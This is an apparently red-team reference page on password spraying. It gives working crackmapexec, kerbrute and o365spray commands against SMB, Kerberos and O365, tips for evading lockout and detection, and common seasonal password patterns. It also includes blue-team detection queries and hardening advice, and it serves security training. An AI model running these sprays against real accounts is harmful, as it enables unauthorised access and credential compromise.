---
title: "Password Spraying"
category: "red-team"
tags: ["initial-access", "credentials", "brute-force"]
platform: "agnostic"
mitre: ["T1110.003"]
difficulty: "intermediate"
updated: "2026-07-11"
author: "core"
---

# Password Spraying

## TL;DR
One password (e.g. `Season2026!`) against many accounts — instead of many passwords against one. Avoids lockout because each account gets 1 attempt per cycle.

## Requirements / Context
- A list of users (from OSINT / enumeration).
- Knowledge of the **lockout policy** (never cross the threshold!).

## Commands
```bash
# SMB / AD (CrackMapExec) – mind lockout, --continue-on-success off by default
crackmapexec smb 10.10.10.0/24 -u users.txt -p 'Season2026!' --no-bruteforce

# Kerberos pre-auth spray (quiet, doesn't log 4625 the same way)
kerbrute passwordspray -d corp.local users.txt 'Season2026!'

# OWA / O365
o365spray --spray -U users.txt -p 'Season2026!' --domain corp.com
```

## OPSEC
- **1 password per cycle**, wait out the lockout window (e.g. 30 min) between attempts.
- Spread over time; avoid scanning everything at once.
- Seasonal/company password patterns: `Company123`, `Month2026!`, `Welcome1`.

## Detection (Blue Team)
```kql
// Sentinel / Defender – many accounts, one source, failed logins
SigninLogs
| where ResultType != 0
| summarize FailedAccounts = dcount(UserPrincipalName) by IPAddress, bin(TimeGenerated, 1h)
| where FailedAccounts > 10
```
- Windows Event **4625** (failed logon) from many accounts / one IP.
- Kerberos **4771** (pre-auth failed).

## Mitigation / Hardening
- MFA (kills most sprays).
- Smart lockout (Azure AD), conditional access, block legacy auth.
- Ban weak/seasonal passwords (banned password list).

## Sources
- [MITRE T1110.003](https://attack.mitre.org/techniques/T1110/003/)
